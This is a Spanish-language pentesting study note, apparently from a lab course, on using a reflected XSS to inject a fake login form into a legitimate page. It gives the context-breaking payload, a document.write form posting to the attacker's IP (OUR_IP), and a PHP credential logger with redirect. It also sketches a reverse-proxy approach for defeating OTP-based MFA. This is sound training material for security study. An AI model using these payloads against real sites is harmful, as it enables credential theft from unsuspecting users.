---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XSS
Fecha de actualización: 2026-06-02
Nota previa: "[[07 - Defacing]]"
Nota siguiente: "[[09 - Robo de sesión]]"
Area: "[[XSS.base|XSS]]"
---
---

<mark style="background: #ADCCFFA6;">El phishing con XSS inyecta un formulario de login falso en una página legítima para que la víctima envíe sus credenciales al servidor del atacante</mark>. En un pentest también sirve como ejercicio de concienciación: mide cuánto confían los empleados en una aplicación interna que no esperan que les haga daño.

# Descubrir el punto de inyección

El objetivo es un visor de imágenes en `/phishing` con un parámetro `url=`. El payload básico `<script>alert()</script>` **no** se ejecuta —cae dentro del `src` de una etiqueta `<img>`, que muestra el icono de imagen rota—. Hay que **romper el contexto** primero, cerrando la etiqueta:

```html
'><script>alert(window.origin)</script>
```

Visualiza siempre cómo aparece tu entrada en el HTML para saber de qué contexto escapar.

# Inyectar el formulario de login

Con un payload que ejecute, escribimos un formulario en la página con `document.write()`. El `action` apunta a **nuestra IP** (`ip a` → `tun0`), donde escucharemos:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
```

# Limpiar la página

El formulario original del visor sigue visible, lo que delata el engaño. Lo quitamos por su `id` (que encontramos con el inspector `CTRL+SHIFT+C`), y comentamos el HTML sobrante tras el payload con `<!--`:

```javascript
document.getElementById('urlform').remove();
```

El payload final, sobre el `Reflected XSS` del parámetro `url`:

```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP>...</form>');document.getElementById('urlform').remove();</script><!--
```

![Visor de imágenes con un formulario de login falso inyectado: solo se ven los campos Username y Password](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_3.jpg)

# Capturar las credenciales

Un `nc -lvnp 80` ya recibe los datos (`GET /?username=test&password=test`), pero la víctima vería un error "site can't be reached" — sospechoso. Mejor un pequeño servidor PHP que <mark style="background: #FFB86CA6;">registra las credenciales y **redirige** a la víctima a la página original</mark>, de modo que cree que el login funcionó:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```shell-session
$ sudo php -S 0.0.0.0:80
$ cat creds.txt
Username: test | Password: test
```

> [!important]+ Por qué el phishing client-side es tan potente
> A diferencia del phishing por correo, aquí <mark style="background: #FF5582A6;">el formulario falso vive en el **dominio legítimo**</mark>: la URL es real, el certificado `TLS` es válido y el candado del navegador es verde. La víctima no tiene ninguna de las señales típicas de phishing para sospechar. Por eso un XSS en una app de confianza convierte el phishing en algo casi indetectable para el usuario. `BeEF` (Browser Exploitation Framework) automatiza este tipo de *hooking* del navegador de la víctima para ataques más elaborados. En un escenario moderno, el formulario inyectado puede hacer de **proxy inverso** (estilo `evilginx`/`modlishka`): reenvía las credenciales al login real para capturar también el **segundo factor** y la cookie de sesión que devuelve, derrotando el MFA basado en OTP. El XSS *in-domain* elimina la única señal —un dominio sospechoso— que delataría ese proxy.

Inyectar formularios roba credenciales, pero hay un atajo que ni siquiera las necesita: robar directamente la **sesión** ya iniciada. Eso es [[09 - Robo de sesión]].
